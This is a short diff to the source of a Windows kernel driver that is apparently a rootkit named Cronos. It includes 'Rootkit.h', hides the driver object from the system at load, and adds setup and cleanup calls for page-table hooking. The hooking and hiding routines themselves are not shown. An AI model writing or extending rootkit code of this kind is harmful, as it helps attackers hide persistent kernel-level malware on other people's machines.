@@ -2,6 +2,7 @@
 #include <ntddk.h>
 #include "Driver.h"
 #include "Rootkit.h"
+#include "PtHook.h"
 
 // Global variable for PT support
 BOOLEAN g_HasPtWrite = FALSE;
@@ -65,6 +66,15 @@ DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
 	}
 
 	HideDriver(DriverObject);
+
+	// Initialize PT hooking infrastructure
+	if (g_HasPtWrite) {
+		status = InitializePtHooking();
+		if (!NT_SUCCESS(status)) {
+			KdPrint(("[-] Failed to initialize PT hooking: 0x%x\n", status));
+			// Continue without PT hooking
+		}
+	}
 
 	return status;
 }
@@ -210,6 +220,9 @@ NTSTATUS DriverCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
 VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
 {
 	KdPrint(("[+] Driver unload called\n"));
+
+	// Cleanup PT hooking infrastructure
+	CleanupPtHooking();
 
 	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Cronos");
 	IoDeleteSymbolicLink(&symLink);
